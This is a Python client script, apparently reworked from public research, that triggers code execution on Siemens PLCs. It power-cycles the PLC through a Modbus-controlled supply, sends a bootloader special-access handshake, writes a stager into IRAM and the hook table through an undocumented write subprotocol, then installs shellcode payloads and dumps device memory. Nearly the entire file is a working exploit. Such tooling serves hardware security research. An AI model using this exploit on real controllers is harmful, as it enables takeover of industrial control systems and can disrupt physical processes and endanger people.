#!/usr/bin/env python3
# Would you please hold my beer while I am cleaning this code?
# ./client.py --switch-power --powersupply-host=localhost --powersupply-port=9001 --powersupply-delay=10 run -p payloads/hello_world/hello_world.bin

import struct
import time
import socket
import select
import sys
import subprocess
#import crc32be
import os
import argparse
import logging
from pymodbus.client.sync import ModbusTcpClient # Changed for pymodbus 2.x compatibility

from binascii import hexlify

from pwn import remote, context, log, xor
context.update(log_level="info", bits=32, endian="big")

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Runtime configs
SEND_REQ_SAFETY_SLEEP_AMT = 0.01

STAGER_PL_FILENAME = "payloads/stager/stager.bin"
DUMPMEM_PL_FILENAME = "payloads/dump_mem/build/dump_mem.bin"
FIRST_PAYLOAD_LOCATION = 0x10010100
MAX_MSG_LEN = 192-2
DEFAULT_STAGER_ADDHOOK_IND = 0x20
DEFAULT_SECOND_ADD_HOOK_IND = 0x1a
IRAM_STAGER_START = 0x10030100
IRAM_STAGER_END = 0x100303FC
IRAM_STAGER_MAX_SIZE = IRAM_STAGER_END - IRAM_STAGER_START
BOOTLOADER_EMPTY_MEM = 0x20000

ANSW_INVALID_CHECKSUM = b"\xff\x80\x03" # Changed to bytes
ANSW_ENTER_SUBPROTO_SUCCESS = b"\x80\x00" # Changed to bytes

UART_WRITE_BUF = 0x100367EC
UART_READ_BUF = 0x100366EC
ADD_HOOK_TABLE_START = 0x1003ABA0

SUBPROT_80_MODE_IRAM = 1
SUBPROT_80_IOC_SPI = 2
SUBPROT_80_MODE_FLASH = 3
SUBPROT_80_MODE_NOP = 4

SUBPROT_80_MODE_MAGICS = [None, 0x3BC2, 0x9d26, 0xe17a, 0xc54f]

# Actions (can be used by GUI if needed, or keep GUI specific actions separate)
ACTION_INVOKE_HOOK = "invoke"
ACTION_DUMP = 'dump'
ACTION_TEST = "test"
ACTION_TIC_TAC_TOE = "tictactoe"
ACTION_HELLO_LOOP = "hello_loop"

# --- Helper Functions (mostly unchanged but will be methods of PLCInterface or called by it) ---
def _calc_checksum_byte(incoming):
    return struct.pack("<i", -sum(incoming[:incoming[0]]))[0]

def _format_bytes(n):
    if n < 1024:
        return "%d B" % n
    elif n < 1024 * 1024:
        return "%.2f KB" % (n / 1024.0)
    elif n < 1024 * 1024 * 1024:
        return "%.2f MB" % (n / (1024.0 * 1024.0))
    else:
        return "%.2f GB" % (n / (1024.0 * 1024.0 * 1024.0))

def _format_time(s):
    s = int(s)
    if s < 60:
        return "%ds" % s
    m, s = divmod(s, 60)
    if m < 60:
        return "%dm %ds" % (m, s)
    h, m = divmod(m, 60)
    return "%dh %dm" % (h, m)


class PayloadManager(object):
    def __init__(self, first_payload_location):
        self.next_payload_location = first_payload_location

    def update_next_payload_location(self, tar_addr, shellcode_len):
        if tar_addr == self.next_payload_location:
            self.next_payload_location += shellcode_len
            while self.next_payload_location % 4 != 0:
                self.next_payload_location += 1
    
    def get_next_payload_location(self):
        return self.next_payload_location


class PLCInterface(object):
    # Custom exception for handshake failures
    class HandshakeError(Exception):
        pass

    def __init__(self, host, port, progress_callback=None):
        self.host = host
        self.port = port
        self.r = None # pwnlib remote connection object
        self.payload_manager = PayloadManager(FIRST_PAYLOAD_LOCATION)
        self.stager_addhook_ind = None
        self.progress_callback = progress_callback # For GUI updates

    def connect(self):
        try:
            self.r = remote(self.host, self.port, timeout=5) # Added timeout
            logger.info(f"Successfully connected to {self.host}:{self.port}")
            return True
        except Exception as e:
            logger.error(f"[!] Failed to connect to {self.host}:{self.port}: {e}")
            self.r = None
            return False

    def disconnect(self):
        if self.r:
            try:
                self.r.close()
                logger.info(f"Disconnected from {self.host}:{self.port}")
            except Exception as e:
                logger.error(f"Error during disconnect: {e}")
            finally:
                self.r = None
        return True

    def _send_packet_internal(self, msg, step=2, sleep_amt=0.01):
        if not self.r: raise ConnectionError("Not connected to PLC.")
        if len(msg) > MAX_MSG_LEN:
            raise ValueError(f"Message length {len(msg)} exceeds MAX_MSG_LEN {MAX_MSG_LEN}")
        time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
        msg = bytes([len(msg) + 1]) + msg
        msg = msg + bytes([_calc_checksum_byte(msg)])
        log.debug(f"sending packet: {hexlify(msg)}")
        for i in range(0, len(msg), step):
            time.sleep(sleep_amt)
            self.r.send(msg[i:i+step])

    def _recv_packet_internal(self):
        if not self.r: raise ConnectionError("Not connected to PLC.")
        try:
            answ = self.r.recv(1, timeout=2) # Added timeout
            if not answ:
                logger.error("Receive timeout or empty first byte.")
                return None
            rem = answ[0]
            while rem != 0:
                add = self.r.recv(rem, timeout=2) # Added timeout
                if not add:
                    logger.error("Receive timeout or empty subsequent bytes.")
                    return None
                rem -= len(add)
                answ += add

            if _calc_checksum_byte(answ[:-1]) != answ[-1]:
                logger.error(f"Checksum validity failed. Got: {answ} [{hexlify(answ)}]")
                return None
            return answ[1:-1]
        except socket.timeout:
            logger.error("Socket timeout during recv_packet.")
            return None
        except Exception as e:
            logger.error(f"Exception in recv_packet: {e}")
            return None


    def _encode_packet_for_stager(self, chunk):
        for i in range(1, 256):
            if i.to_bytes(1, 'big') not in chunk and i != len(chunk)+2:
                log.debug(f"Sending chunk with xor key: 0x{i:02x}")
                encoded = i.to_bytes(1, 'big') + bytes([b ^ i for b in chunk])
                return encoded
        logger.error(f"Could not encode chunk: {hexlify(chunk)}")
        raise ValueError("Could not encode chunk")

    def _send_full_msg_via_stager(self, msg, chunk_size=2, sleep_amt=0.01):
        if not self.r: raise ConnectionError("Not connected to PLC.")
        for i in range(0, len(msg), MAX_MSG_LEN-1):
            time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
            chunk = msg[i:i + MAX_MSG_LEN - 1]
            log.debug(f"Send progress: 0x{i:06x}/0x{len(msg):06x} ({float(i) / float(len(msg)):.2f})")
            self._send_packet_internal(self._encode_packet_for_stager(chunk), chunk_size, sleep_amt)
            answ = self._recv_packet_internal()
            if answ is None:
                 raise ConnectionError("Failed to receive ack after sending stager chunk.")
            if not len(answ) == 1:
                logger.warning(f"expecting empty ack package (answ of size 1), got '{answ}' instead")
                raise ValueError("Invalid ack package")
            if answ == b"\xff": # Changed to bytes
                logger.warning("[WARNING] Interrupting the sending...")
                return False # Indicate interruption
        self._send_packet_internal(self._encode_packet_for_stager(b"")) # Empty chunk signals end
        answ = self._recv_packet_internal()
        if answ is None:
            raise ConnectionError("Failed to receive final ack after sending stager message.")
        return True # Indicate success


    def _invoke_primary_handler(self, handler_ind, args=b"", await_response=True):
        payload = bytes([handler_ind])
        self._send_packet_internal(payload + args)
        if await_response:
            return self._recv_packet_internal()
        return None

    def _enter_subproto_handler(self, mode):
        assert(1 <= mode <= len(SUBPROT_80_MODE_MAGICS))
        return self._invoke_primary_handler(0x80, struct.pack(">H", SUBPROT_80_MODE_MAGICS[mode]))

    def _leave_subproto_handler(self):
        self._send_packet_internal(b'\x81\xD0\x67')
        return self._recv_packet_internal()

    def _raw_subproto_write(self, arg_dw, add_args, really=False, step=2, sleep_amt=0.01):
        if not really:
            raise RuntimeError("Dangerous write attempted without confirmation")
        self._send_packet_internal(b'\x84\x5a\x2e' + struct.pack(">I", arg_dw) + add_args, step, sleep_amt)
        return self._recv_packet_internal()

    def _exploit_write_chunk_to_iram(self, tar, contents, already_in_80_handler=False):
        assert(len(contents) % 2 == 0)
        assert(len(contents)+8 <= MAX_MSG_LEN)
        assert(0x10000000 <= tar)
        assert(tar + len(contents) <= 0x10800000)
        
        if not already_in_80_handler:
            answ = self._enter_subproto_handler(SUBPROT_80_MODE_IRAM)
            if answ != ANSW_ENTER_SUBPROTO_SUCCESS:
                raise RuntimeError(f"Failed to enter IRAM subprotocol: {answ}")

        target_argument = tar-0x10000000
        # First write with FF pattern (seems to be a quirk or requirement)
        self._raw_subproto_write(target_argument, b'\xff' * len(contents), True)
        
        # Actual content write
        # Handle potential issue with null bytes or specific patterns if needed, as in original
        if len(contents) == 4 and (contents[:2] in [b'\x00\x00', b'\x0a\x00'] or contents[2:4] in [b'\x00\x00', b'\x0a\x00']):
            self._raw_subproto_write(target_argument, contents[:2], True)
            self._raw_subproto_write(target_argument+2, contents[2:4], True)
        else:
            self._raw_subproto_write(target_argument, contents, True)
        
        if not already_in_80_handler:
            self._leave_subproto_handler()
        return True # Simplified, original returned answ

    def exploit_write_to_iram(self, tar, contents):
        assert(len(contents) % 2 == 0)
        assert(0x10000000 <= tar and tar + len(contents) <= 0x10800000)
        
        answ = self._enter_subproto_handler(SUBPROT_80_MODE_IRAM)
        if answ != ANSW_ENTER_SUBPROTO_SUCCESS:
            raise RuntimeError(f"Failed to enter IRAM subprotocol for multi-chunk write: {answ}")
        
        if len(contents) % 4 == 2: # Handle unaligned start if necessary
            self._exploit_write_chunk_to_iram(tar, contents[:2], True)
            tar += 2
            contents = contents[2:]
            
        chunk_size = 16 # As in original
        for i in range(0, len(contents), chunk_size):
            logger.debug(f"Writing {i:04x}/{len(contents):04x}")
            chunk = contents[i:i+chunk_size]
            self._exploit_write_chunk_to_iram(tar+i, chunk, True) # already_in_80_handler is True
            
        self._leave_subproto_handler()
        return True # Simplified

    def get_plc_version(self):
        answ = self._invoke_primary_handler(0) # Hook index 0 for version
        if answ and len(answ) > 3:
            try:
                version_str = answ[2:3].decode() + b'.'.join([str(c).encode() for c in answ[3:-2]]).decode()
                return version_str
            except Exception as e:
                logger.error(f"Error decoding version string: {e} from {answ}")
                return "Unknown"
        return "Unknown"

    def send_bye(self):
        hook_ind = 0xa2
        answ = self._invoke_primary_handler(hook_ind)
        if answ == b'\xa2\x00':
            logger.debug(f"[+] PLC responded to bye() as expected ({repr(answ)}).")
            return True
        elif answ and answ[0] in range(0x00, 0x80):
            logger.warning(f"[!] PLC responded to bye() with handler index: 0x{answ[0]:02x} ({repr(answ)}), likely last handler used.")
            return True # Still considered a response
        else:
            logger.warning(f"[!] Warning: Unexpected response to bye(): {repr(answ)}")
            return False

    def invoke_add_hook(self, add_hook_no, args=b"", await_response=True):
        assert(0 <= add_hook_no <= 0x20)
        hook_ind = 0x1c
        full_args = bytes([add_hook_no]) + args
        return self._invoke_primary_handler(hook_ind, full_args, await_response)

    def _exploit_install_add_hook_internal(self, tar_addr, shellcode, add_hook_no):
        assert(0 <= add_hook_no <= 0x20)
        if len(shellcode) % 2 != 0:
            shellcode += b'\xff' # Padding
        self.exploit_write_to_iram(tar_addr, shellcode)
        # Write function pointer to the hook table
        hook_table_entry_addr = ADD_HOOK_TABLE_START + 8 * add_hook_no + 2 # Offset for func ptr
        # Original: b'\x00\xff' + struct.pack(">I", tar_addr). Assuming \x00\xff are some flags/length.
        # For simplicity, let's ensure the structure is correct. The table entry is 8 bytes.
        # Typically: [flags/len (2B)][func_ptr (4B)][? (2B)] or similar.
        # The original code targets +2, so it's likely [?? (2B)][func_ptr (4B)][?? (2B)]
        # and it writes 00 FF and then the address.
        # Let's replicate: first part seems to be flags/enable, second is address.
        # It writes to `ADD_HOOK_TABLE_START + 8 * add_hook_no + 2`, so it's setting the address part.
        # The b'\x00\xff' might be related to enabling the hook or setting its argument length expectation.
        # The original writes `b'\x00\xff' + struct.pack(">I", tar_addr)`
        # This is 2 bytes + 4 bytes = 6 bytes.
        # The table entry is 8 bytes. The +2 offset means it's writing into the middle.
        # Entry: [byte0, byte1] [byte2, byte3, byte4, byte5] [byte6, byte7]
        # Address tar_addr is written at offset +2, +3, +4, +5.
        # b'\x00\xff' is written at offset +0, +1 of this 6-byte write, so table offset +2, +3.
        # This seems a bit off. Let's re-check original:
        # exploit_write_to_iram(r, ADD_HOOK_TABLE_START + 8 * add_hook_no + 2, b'\x00\xff' + struct.pack(">I", tar_addr))
        # This writes 6 bytes starting at offset +2 of the 8-byte entry.
        # So it fills bytes 2,3,4,5,6,7 of the entry.
        # [??, ??, 00, FF, ADDR_MSB, ADDR_B, ADDR_B, ADDR_LSB]
        # This means 0x00FF is part of the address, which is unlikely.
        # Let's assume the original meant to set flags and then the pointer:
        # Most likely, the structure is [flags_and_len (2 bytes)][pointer (4 bytes)][unused/checksum (2 bytes)]
        # And ADD_HOOK_TABLE_START + 8 * add_hook_no points to the start of the entry.
        # To set the pointer: ADD_HOOK_TABLE_START + 8 * add_hook_no + 2
        # To set flags: ADD_HOOK_TABLE_START + 8 * add_hook_no
        # The original code `exploit_write_to_iram(r, ADD_HOOK_TABLE_START + 8 * add_hook_no + 2, b'\x00\xff' + struct.pack(">I", tar_addr))`
        # writes `b'\x00\xff'` to `entry_base + 2` and `entry_base + 3`.
        # And `tar_addr` to `entry_base + 4` to `entry_base + 7`.
        # This means the format is likely: `[??, ??, XX, YY, PTR_BYTE0, PTR_BYTE1, PTR_BYTE2, PTR_BYTE3]`
        # where XX, YY are set to 0x00, 0xFF by the original code. This might be specific flags.
        # Let's stick to what the original did:
        self.exploit_write_to_iram(ADD_HOOK_TABLE_START + 8 * add_hook_no + 2, b'\x00\xff' + struct.pack(">I", tar_addr))


    def install_stager_payload(self, stager_shellcode_bytes, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT_STAGER_ADDHOOK_IND):
        if not (0 < len(stager_shellcode_bytes) <= IRAM_STAGER_MAX_SIZE):
            raise ValueError("Stager shellcode size invalid.")
        self._exploit_install_add_hook_internal(tar_addr, stager_shellcode_bytes, add_hook_no)
        self.stager_addhook_ind = add_hook_no
        logger.info(f"Stager installed at 0x{tar_addr:08x} using hook {add_hook_no}.")
        # Stager payload itself doesn't count towards general payload location managed by payload_manager
        return add_hook_no

    def _write_via_stager_internal(self, tar_addr, contents, stager_add_hook_to_use):
        if stager_add_hook_to_use is None:
            raise RuntimeError("Stager not installed or hook index not set.")
        self.invoke_add_hook(stager_add_hook_to_use, struct.pack(">I", tar_addr), await_response=False)
        if not self._send_full_msg_via_stager(contents, 8, 0.01): # chunk_size=8, sleep_amt=0.01 from original
            raise RuntimeError("Failed to send full message via stager (interrupted or error).")


    def install_payload_via_stager(self, payload_shellcode_bytes, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND):
        if self.stager_addhook_ind is None:
            raise RuntimeError("Stager must be installed first.")
        
        tar_addr = self.payload_manager.get_next_payload_location()
        
        # Write the payload's entry into the hook table first
        # Entry: [flags/len (2B)][func_ptr (4B)][checksum/unused (2B)]
        # We need to set the function pointer and appropriate flags.
        # Original: write_via_stager(r, ADD_HOOK_TABLE_START + 8 * add_hook_no, b'\x00\x00\x00\xff' + struct.pack(">I", tar_addr), stager_addhook_ind)
        # This writes 8 bytes: [00,00,00,FF, PTR_MSB, PTR_B, PTR_B, PTR_LSB]
        # So, flags/len = 0x0000, checksum/unused = 0x00FF ? This seems more plausible.
        # Or 0x00 for flags, 0x00 for len, 0xFF for something else.
        # The important part is that it writes the full 8-byte entry.
        hook_entry_data = b'\x00\x00\x00\xff' + struct.pack(">I", tar_addr) # Replicating original
        self._write_via_stager_internal(ADD_HOOK_TABLE_START + 8 * add_hook_no, hook_entry_data, self.stager_addhook_ind)
        
        # Then write the actual shellcode
        self._write_via_stager_internal(tar_addr, payload_shellcode_bytes, self.stager_addhook_ind)
        
        self.payload_manager.update_next_payload_location(tar_addr, len(payload_shellcode_bytes))
        logger.info(f"Payload installed at 0x{tar_addr:08x} using hook {add_hook_no} (via stager hook {self.stager_addhook_ind}).")
        return add_hook_no


    def execute_memory_dump(self, dump_payload_shellcode_bytes, dump_address, num_bytes_to_dump, baudrate=38400):
        if self.stager_addhook_ind is None:
            logger.warning("Stager not explicitly installed via GUI, attempting to use default or assuming pre-installed.")
            # For GUI, we should ensure stager is installed first.
            # Here, we'll proceed assuming it might be handled by a prior call or is already there.

        dump_payload_hook_index = self.install_payload_via_stager(
            dump_payload_shellcode_bytes, 
            DEFAULT_SECOND_ADD_HOOK_IND # Use a dedicated hook for the dump payload
        )

        logger.info(f"Requesting dump: addr=0x{dump_address:08x}, len={num_bytes_to_dump}, hook={dump_payload_hook_index}")
        # Payload expects 'A' + address (4B) + length (4B)
        args_for_dump = b'A' + struct.pack(">II", dump_address, num_bytes_to_dump)
        answ = self.invoke_add_hook(dump_payload_hook_index, args_for_dump)
        
        if answ is None or not answ.startswith(b'Ok'):
            raise RuntimeError(f"Dump command failed or unexpected response: {answ}")

        log.debug(f"[payload_dump_mem] answ (len: {len(answ)}): {answ}")
        
        # This part needs to be a generator for GUI
        full_dump_data = b""
        received_bytes = 0
        start_time = time.time()
        
        # Yield initial progress before starting the loop
        if self.progress_callback:
            self.progress_callback(0, num_bytes_to_dump, 0, 0, 0) # done, total, speed, elapsed, eta

        while received_bytes < num_bytes_to_dump:
            next_chunk = self._recv_packet_internal()
            if next_chunk is None: # Error during recv
                logger.error("Error receiving dump data chunk.")
                raise ConnectionError("Failed to receive dump data.")
            if next_chunk == b"": # End of transmission marker from payload
                if received_bytes < num_bytes_to_dump:
                    logger.warning(f"Dump ended prematurely. Expected {num_bytes_to_dump}, got {received_bytes}")
                break
            
            full_dump_data += next_chunk
            received_bytes = len(full_dump_data)
            
            if self.progress_callback:
                now = time.time()
                elapsed = now - start_time
                speed = received_bytes / elapsed if elapsed > 0 else 0
                est_total_time = num_bytes_to_dump / speed if speed > 0 else 0
                eta = est_total_time - elapsed if est_total_time > elapsed else 0
                self.progress_callback(received_bytes, num_bytes_to_dump, speed, elapsed, eta)
            else: # Fallback to original stdout logging if no callback
                # Simplified logging for non-GUI use if needed
                if received_bytes % (1024 * 10) == 0: # Log every 10KB
                     logger.info(f"Dump progress: {_format_bytes(received_bytes)} / {_format_bytes(num_bytes_to_dump)}")
        
        logger.info(f"Dump completed. Received {_format_bytes(len(full_dump_data))}.")
        return full_dump_data

    def perform_handshake(self, magic=b"MFGT1", pad=4 * b"A"):
        if not self.r:
            raise ConnectionError("Not connected. Call connect() first.")

        handshake_received = False
        handshake_start_time = time.time()
        greeting_message = None
        
        # Try sending handshake for a short period (e.g., 2 seconds as in original)
        while not handshake_received and (time.time() - handshake_start_time) < 5.0:
            logger.debug(f"Sending handshake: {pad + magic}")
            self.r.send(pad + magic)
            try:
                # Expecting "\5-CPU" or similar
                answ = self.r.recv(256, timeout=0.05) # Short timeout for quick check
            except socket.timeout:
                answ = b''
            except Exception as e:
                logger.error(f"Exception during handshake recv: {e}")
                answ = b''

            if answ and answ.startswith(b"\x05-CPU"): # \x05 is ENQ
                # Ensure full message is received if fragmented
                # The original code `if not answ.startswith(b"\5-CPU"): answ += s.recv(256)`
                # seems to imply it might sometimes get only part of it.
                # However, `startswith` already checks the beginning. If it starts with it, it's likely the one.
                # For robustness, one might try to read more if it's very short, but pwnlib's recv should handle it.
                logger.info(f"[+] Special access greeting received: {answ}")
                self.r.unrecv(answ) # Put it back so the main handler can read it as first packet
                
                # Now, let the main handler logic read the first packet from PLC
                first_packet = self._recv_packet_internal()
                if first_packet is None:
                    logger.error("Failed to receive the initial packet after handshake.")
                    # self.disconnect() # Ensure connection is closed
                    raise self.HandshakeError("Failed to receive the initial packet after special access greeting.")

                logger.info(f"[+] Got special access greeting packet: {first_packet} [{hexlify(first_packet)}]")
                greeting_message = first_packet # This is the actual first message like "-CPU"
                handshake_received = True
                break 
            time.sleep(SEND_REQ_SAFETY_SLEEP_AMT) # Wait a bit before retrying

        if not handshake_received:
            logger.error("[!] Handshake timeout: did not receive special access greeting within the 2s window.")
            # self.disconnect()
            raise self.HandshakeError("Timeout: Did not receive special access greeting.")
        
        return True, greeting_message


# --- Standalone functions (can be called directly, e.g., by GUI for power) ---
def switch_power(mode, modbus_ip, modbus_port, modbus_output):
    """
    Controls the power supply via Modbus TCP.
    :param mode: "on" or "off"
    :param modbus_ip: IP address of the Modbus device
    :param modbus_port: Port of the Modbus device
    :param modbus_output: Coil number to control
    :return: True on success, False on failure
    """
    toggle = True if mode == "on" else False
    client = ModbusTcpClient(modbus_ip, port=modbus_port)
    if not client.connect():
        logger.error("[!] Could not connect to Modbus TCP device at %s:%d", modbus_ip, modbus_port)
        return False
    rr = client.write_coil(modbus_output, toggle)
    if rr.isError():
        logger.error("[!] Modbus write_coil failed: %s", rr)
        client.close()
        return False
    client.close()
    logger.info(f"[+] Modbus coil {modbus_output} set to {toggle} (Modbus TCP at {modbus_ip}:{modbus_port})")
    return True

# --- CLI Main Function (kept for standalone script usage) ---
def main_cli():
    parser = argparse.ArgumentParser(description='Trigger code execution on Siemens PLC')

    common_group = parser.add_argument_group('Common arguments')
    common_group.add_argument('-H', '--host', dest='host', default='localhost',
                        help="Host where socat is forwarding the serial port (default: localhost)")
    common_group.add_argument('-P', '--port', dest='port', type=lambda x: int(x, 0), required=True,
                        help="Local TCP port that socat is listening to, forwarding to serial device")
    common_group.add_argument('--switch-power', dest='switch_power', default=False, action='store_true',
                        help='Switch the power adapter on and off before connecting')
    common_group.add_argument('--powersupply-delay', dest='powersupply_delay', default=1000, type=lambda x: int(x, 0),
                        help="Number of milliseconds to wait between power off and on (default: 1000ms).")
    common_group.add_argument('-s', '--stager', dest="stager_file", type=argparse.FileType('rb'), 
                        default=STAGER_PL_FILENAME, help=f'Location of the stager payload (default: {STAGER_PL_FILENAME})')
    common_group.add_argument('-c', '--continue-plc', dest='continue_plc', default=False, action='store_true', 
                        help="Send 'bye' command to continue PLC execution after action; otherwise waits for input.")

    modbus_group = parser.add_argument_group('Modbus TCP arguments (for --switch-power)')
    modbus_group.add_argument('--modbus-ip', dest='modbus_ip', default='192.168.1.18', 
                        help='Modbus TCP IP address (default: 192.168.1.18)')
    modbus_group.add_argument('--modbus-port', dest='modbus_port', default=502, type=lambda x: int(x, 0), 
                        help='Modbus TCP port (default: 502)')
    modbus_group.add_argument('--modbus-output', dest='modbus_output', type=int, 
                        help='Modbus output/channel to control (required if --switch-power is used)')

    subparsers = parser.add_subparsers(dest="action", help="Action to perform") # Removed required=True for Python 3.6 compatibility
    # For Python 3.6, if no subparser is given, 'action' will be None.
    # We can add a check for this after parsing if necessary.
    # subparsers.required = True # This is an alternative way to make it required if needed, but might also be 3.7+
    # Let's rely on the user providing an action or add a manual check later.


    parser_invoke = subparsers.add_parser(ACTION_INVOKE_HOOK, help="Invoke a previously installed payload hook.")
    parser_invoke.add_argument('-p', '--payload', dest="payload_file", type=argparse.FileType('rb'), required=True,
                        help='The file containing the payload to install and execute.')
    parser_invoke.add_argument('-i', '--hook-index', dest="hook_index", type=int, default=DEFAULT_SECOND_ADD_HOOK_IND,
                        help=f'The additional hook index to use for the payload (default: {DEFAULT_SECOND_ADD_HOOK_IND}).')
    parser_invoke.add_argument('-a', '--args', dest='payload_args', default=b"", type=lambda x: x.encode(),
                        help="Arguments (as string, will be UTF-8 encoded) to be passed to payload invocation.")
    parser_invoke.add_argument('--no-response', dest='await_response', action='store_false', default=True,
                               help="Do not wait for a response after invoking the hook.")


    parser_dump = subparsers.add_parser(ACTION_DUMP, help="Dump memory from the PLC.")
    parser_dump.add_argument('--address', dest="address", type=lambda x: int(x, 0), required=True, 
                        help="Start address for memory dump (e.g., 0x10010100).")
    parser_dump.add_argument('--length', dest="length", type=lambda x: int(x, 0), required=True, 
                        help="Number of bytes to dump.")
    parser_dump.add_argument('--dump-payload', dest='dump_payload_file', type=argparse.FileType('rb'), 
                        default=DUMPMEM_PL_FILENAME, help=f"Payload for dumping memory (default: {DUMPMEM_PL_FILENAME})")
    parser_dump.add_argument('-o', '--out-file', dest='outfile_name', 
                        default=None, help="Name of file to store the dump (default: mem_dump_ADDR_LEN.bin).")

    # Simplified test action for CLI
    parser_test_action = subparsers.add_parser(ACTION_TEST, help="Run a simple test (e.g., get version, install test payload).")
    parser_test_action.add_argument('--test-payload', dest="test_payload_file", type=argparse.FileType('rb'), 
                                   default="payloads/hello_world/hello_world.bin", help="Test payload to execute.")

    args = parser.parse_args()

    # --- Power cycling ---
    if args.switch_power:
        if args.modbus_output is None:
            parser.error("--modbus-output is required when --switch-power is used.")
        
        logger.info(f"Turning OFF power supply (Output: {args.modbus_output} at {args.modbus_ip}:{args.modbus_port})...")
        if not switch_power('off', args.modbus_ip, args.modbus_port, args.modbus_output):
            logger.error("Failed to turn off power supply. Aborting.")
            sys.exit(1)
        
        logger.info(f"Waiting for {args.powersupply_delay}ms...")
        time.sleep(args.powersupply_delay / 1000.0)
        
        logger.info(f"Turning ON power supply (Output: {args.modbus_output} at {args.modbus_ip}:{args.modbus_port})...")
        if not switch_power('on', args.modbus_ip, args.modbus_port, args.modbus_output):
            logger.error("Failed to turn on power supply. Aborting.")
            sys.exit(1)
        
        # Add a small fixed delay after power ON before attempting connection,
        # as PLC bootloader might take a moment.
        # The handshake itself has a 2-second window.
        logger.info("Waiting 500ms for PLC to initialize after power on...")
        time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)


    # --- PLC Connection and Operations ---
    # Simple progress callback for CLI dump
    def cli_dump_progress(done, total, speed, elapsed, eta):
        bar_len = 30
        percent = float(done) / total if total > 0 else 0
        filled = int(bar_len * percent)
        bar = '[' + '=' * filled + ' ' * (bar_len - filled) + ']'
        sys.stdout.write(f"\r{bar} {percent*100:6.1f}% {_format_bytes(done)}/{_format_bytes(total)} | "
                         f"Speed: {_format_bytes(speed)}/s | Elapsed: {_format_time(elapsed)} | ETA: {_format_time(eta)}  ")
        sys.stdout.flush()
        if done == total:
            sys.stdout.write("\n")

    plc = PLCInterface(args.host, args.port, progress_callback=cli_dump_progress if args.action == ACTION_DUMP else None)

    if not plc.connect():
        sys.exit(1)

    try:
        # --- Handshake ---
        # The original script's handshake logic is slightly different when power_switch is involved.
        # It sends MFGT1 repeatedly. The PLCInterface.perform_handshake also does this.
        logger.info("Attempting handshake with PLC...")
        success, greeting = plc.perform_handshake()
        if not success:
            logger.error(f"Handshake failed: {greeting}")
            sys.exit(1)
        logger.info(f"Handshake successful! Initial greeting: {greeting} ({hexlify(greeting)})")

        # --- Get Version ---
        version = plc.get_plc_version()
        logger.info(f"PLC BootLoader Version: {version}")

        # --- Install Stager ---
        stager_code = args.stager_file.read()
        args.stager_file.close()
        logger.info(f"Installing stager payload ({len(stager_code)} bytes)...")
        plc.install_stager_payload(stager_code)
        logger.info("Stager installed successfully.")

        # --- Perform Action ---
        if args.action == ACTION_DUMP:
            dump_payload_code = args.dump_payload_file.read()
            args.dump_payload_file.close()
            
            out_filename = args.outfile_name
            if not out_filename:
                out_filename = f"mem_dump_{args.address:08x}_{args.address + args.length:08x}.bin"

            logger.info(f"Starting memory dump: Address=0x{args.address:08x}, Length={args.length} bytes.")
            logger.info(f"Using dump payload: {args.dump_payload_file.name} ({len(dump_payload_code)} bytes)")
            
            dumped_data = plc.execute_memory_dump(dump_payload_code, args.address, args.length)
            
            with open(out_filename, "wb") as f:
                f.write(dumped_data)
            logger.info(f"Memory dump saved to {out_filename} ({len(dumped_data)} bytes written).")

        elif args.action == ACTION_INVOKE_HOOK:
            payload_code = args.payload_file.read()
            args.payload_file.close()
            
            logger.info(f"Installing payload '{args.payload_file.name}' ({len(payload_code)} bytes) to hook {args.hook_index}...")
            installed_hook_idx = plc.install_payload_via_stager(payload_code, add_hook_no=args.hook_index)
            
            logger.info(f"Invoking payload hook {installed_hook_idx} with args: '{args.payload_args.decode(errors='replace')}' "
                        f"(await_response={args.await_response})...")
            response = plc.invoke_add_hook(installed_hook_idx, args.payload_args, await_response=args.await_response)
            
            if args.await_response:
                if response is not None:
                    logger.info(f"Response from payload: {response} ({hexlify(response)})")
                    try:
                        logger.info(f"Decoded response: {response.decode(errors='replace')}")
                    except: pass
                else:
                    logger.warning("No response received from payload (or error in reception).")
            else:
                logger.info("Payload invoked without awaiting response.")

        elif args.action == ACTION_TEST:
            logger.info("Performing test action...")
            test_payload_code = args.test_payload_file.read()
            args.test_payload_file.close()

            logger.info(f"Installing test payload '{args.test_payload_file.name}' ({len(test_payload_code)} bytes)...")
            test_hook_idx = plc.install_payload_via_stager(test_payload_code, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND)

            logger.info(f"Invoking test payload hook {test_hook_idx}...")
            response = plc.invoke_add_hook(test_hook_idx, await_response=True)
            if response is not None:
                logger.info(f"Test payload response: {response} ({hexlify(response)})")
                try:
                    logger.info(f"Decoded: {response.decode(errors='replace')}")
                except: pass
            else:
                logger.warning("No response from test payload.")
            logger.info("Test action completed.")
            
        # Add other actions (TIC_TAC_TOE, HELLO_LOOP) here if desired for CLI
        # For now, they were more complex interaction-wise in the original script.

    except ConnectionError as e:
        logger.error(f"Connection Error: {e}")
        sys.exit(1)
    except ValueError as e:
        logger.error(f"Value Error: {e}")
        sys.exit(1)
    except RuntimeError as e:
        logger.error(f"Runtime Error: {e}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"An unexpected error occurred: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
    finally:
        if plc.r is not None: # If connection was made
            if args.continue_plc:
                logger.info("Sending 'bye' to PLC to continue execution...")
                plc.send_bye()
            else:
                try:
                    input("Action complete. Press Enter to send 'bye' to PLC and continue its execution, or Ctrl+C to exit without sending 'bye'.")
                    logger.info("Sending 'bye' to PLC...")
                    plc.send_bye()
                except KeyboardInterrupt:
                    logger.info("Exiting without sending 'bye'. PLC might require a power cycle.")
            plc.disconnect()
        logger.info("CLI operation finished.")


if __name__ == "__main__":
    main_cli()
